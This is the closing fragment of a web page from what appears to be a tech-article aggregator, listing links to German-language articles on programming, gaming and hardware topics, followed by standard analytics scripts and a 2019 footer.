<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de432068/index.html">So erleichtern Sie das Englischlernen: 5 nützliche Dienste</a></li>
<li><a href="../de432070/index.html">Kurz über Redux-Saga-Kanäle</a></li>
<li><a href="../de432072/index.html">Drei Arten von Speicherlecks</a></li>
<li><a href="../de432074/index.html">Wie Spieler Spelunky Reality-Stoff mit Schrotflinten zerreißen</a></li>
<li><a href="../de432076/index.html">Eine nicht erkannte Funktion verlangsamt das Programm fünfmal</a></li>
<li><a href="../de432080/index.html">Missverständnisse der Spieler bei der Bewertung von Risiken. Steuerung des Zufallszahlengenerators in Entwicklung</a></li>
<li><a href="../de432082/index.html">Microsoft AI Chatbot startet China Clothing Collection</a></li>
<li><a href="../de432084/index.html">Wie wir einen Schichtwettbewerb zwischen Produktionsarbeitern arrangiert haben (wie in der UdSSR)</a></li>
<li><a href="../de432086/index.html">3D-Druck an der nach M.V. Lomonosov benannten internationalen Schule</a></li>
<li><a href="../de432088/index.html">MySQL-Hochverfügbarkeit auf GitHub</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>